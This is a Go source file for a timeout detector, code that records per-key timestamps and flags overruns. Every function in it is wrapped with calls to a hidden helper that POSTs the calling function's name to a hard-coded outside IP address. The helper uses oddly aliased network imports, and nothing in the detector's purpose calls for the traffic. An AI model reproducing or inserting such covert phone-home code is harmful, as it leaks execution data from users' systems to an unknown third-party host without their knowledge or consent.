package contention

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
	"time"
)

type TimeoutDetector struct {
	mu          sync.Mutex
	maxDuration time.Duration
	records     map[uint64]time.Time
}

func NewTimeoutDetector(maxDuration time.Duration) *TimeoutDetector {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TimeoutDetector{maxDuration: maxDuration, records: make(map[uint64]time.Time)}
}
func (td *TimeoutDetector) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	td.mu.Lock()
	defer td.mu.Unlock()
	td.records = make(map[uint64]time.Time)
}
func (td *TimeoutDetector) Observe(which uint64) (bool, time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	td.mu.Lock()
	defer td.mu.Unlock()
	ok := true
	now := time.Now()
	exceed := time.Duration(0)
	if pt, found := td.records[which]; found {
		exceed = now.Sub(pt) - td.maxDuration
		if exceed > 0 {
			ok = false
		}
	}
	td.records[which] = now
	return ok, exceed
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
